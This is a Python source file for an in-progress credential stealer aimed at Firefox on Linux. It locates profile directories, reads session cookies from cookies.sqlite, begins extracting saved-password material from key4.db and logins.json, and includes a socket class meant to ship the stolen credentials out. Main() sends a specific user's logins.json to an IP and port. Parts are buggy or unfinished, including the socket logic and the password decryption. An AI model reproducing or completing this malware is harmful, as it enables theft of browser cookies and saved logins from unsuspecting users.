from abc import ABC, abstractmethod
import os, socket, platform, sqlite3, json;


# * Classes to detect Operating System
class OSInterface(ABC):
    @abstractmethod
    def DetectOperatingSystem(self):
        pass


class OSDetector(OSInterface):
    def DetectOperatingSystem(self):
        return platform.system();



# * Classes to search profile directories in different browsers
class ProfileDirectoryFinder(ABC):
    @abstractmethod
    def FindProfileDirectoryInLinux(self):
        pass

    @abstractmethod 
    def FindProfileDirectoryInWindows(self):
        pass


class FirefoxProfileFinder(ProfileDirectoryFinder):

    def FindProfileDirectoryInLinux(self):

        homeDirectory = os.path.expanduser("~");
        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")


        if ".mozilla" not in os.listdir(homeDirectory):
            raise FileNotFoundError("Firefox not installed")


        for directory in os.listdir(browserDirectory):

            if(directory.endswith(".default-esr")):
                browserDirectory = os.path.join(browserDirectory, directory);
                return browserDirectory

            elif(directory.endswith(".default")):
                browserDirectory = os.path.join(browserDirectory, directory); 
                return browserDirectory
            

        raise FileNotFoundError("Firefox profile directory not found")
         


    def FindProfileDirectoryInWindows(self):
        pass

    
    
    

# * Classes to obtain Browser Cookies
class BrowserCookiesGetter(ABC):

    @abstractmethod
    def GetCookiesInLinux(self):
        pass

    @abstractmethod
    def GetCookiesInWindows(self):
        pass

    


class FirefoxCookiesGetter(BrowserCookiesGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder): 
        self.profileFinder = profileFinder;


    def GetCookiesInLinux(self):

        try: 

            browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
            cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");


            if not os.path.exists(cookiesDbPath):
                raise FileNotFoundError("Cookies database not found!");


            connection = sqlite3.connect(browserDirectory)
            cursor = connection.cursor()
            cursor.execute('SELECT name, value, host FROM moz_cookies')
            cookies = cursor.fetchall()
            connection.close()

            return cookies;

        except Exception as e:
            print(e)
            return False;
            


    def GetCookiesInWindows(self, username):
        pass




# * Classes to get saved passwords in browsers 
class BrowserPasswordsGetter(ABC):

    @abstractmethod
    def GetPasswordInLinux(self):
        pass

    @abstractmethod
    def GetPasswordsInWindows(self):
        pass



class FirefoxPasswordsGetter(BrowserPasswordsGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder):
        self.profileFinder = profileFinder;


    def GetPasswordInLinux(self):


        try:

            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
            keyDbPath = os.path.join(browserDirectory, "key4.db");             
            loginsFilePath = os.path.join(browserDirectory, "logins.json")


            if(not os.path.exists(keyDbPath) or not os.path.exists(loginsFilePath)): 
                raise FileNotFoundError("Key4.db or logins.json not exists!");



            salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password'");

            
            print(loginsFilePath)        


            
            
           
            
            
            
            
        except Exception as e:
            print(e)
        




    def GetPasswordsInWindows(self):
        
        return "Pipe Porrero"

        
    def __ExecuteSQLQuery(self, dbPath, sqlQuery):


        with sqlite3.connect(dbPath) as db:

            cursor = db.cursor()
            cursor.execute(sqlQuery);
            results = cursor.fetchone()

        return results;





# * Classes to send Browser credentials with Sockets
class SocketSender(ABC):

    @abstractmethod
    def SendFileData(self):
        pass

    @abstractmethod
    def SendPythonData(self):
        pass
        

    
class BrowserDataSender(SocketSender):

    def __init__(self, ip, port):
        self._ip = ip;
        self._port = port;
        


    def __EstablishConnection(self):
        #Create Connection 
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        serverAddress = (self.ip, self._port);        
        serverSocket.bind(serverAddress);

        serverSocket.listen();

        clientSocket, clientAddress = serverSocket.accept()
        return serverSocket, clientSocket



    def SendFileData(self, path):
        
        if(not os.path.exists(path)): raise FileNotFoundError("File not exists!");

        with open(path, "r") as File:
            dataFile = File.read();

        serverSocket, clientSocket = self.__EstablishConnection()

        
        try:

            clientSocket.sendall(str(dataFile).encode());

        except Exception as e:
            print("Error with connection!" + e);

        finally:
            clientSocket.close();
            serverSocket.close();



    def SendPythonData(self, data={}):

        serverSocket, clientSocket = self.__EstablishConnection()

        
        try:

            clientSocket.sendall(str(data).encode());

        except Exception as e:
            print("Error with connection!" + e);

        finally:
            clientSocket.close();
            serverSocket.close();


               







        

       






        










def Main():


    sender = BrowserDataSender("192.168.1.1", 3000);

    sender.SendFileData("/home/xander/.mozilla/firefox/7ik0vvhp.default-esr/logins.json");


    










    # finder = FirefoxProfileFinder();

    # xd = FirefoxPasswordsGetter(finder);

    # xd.GetPasswordInLinux()




if __name__ == "__main__":
    Main()
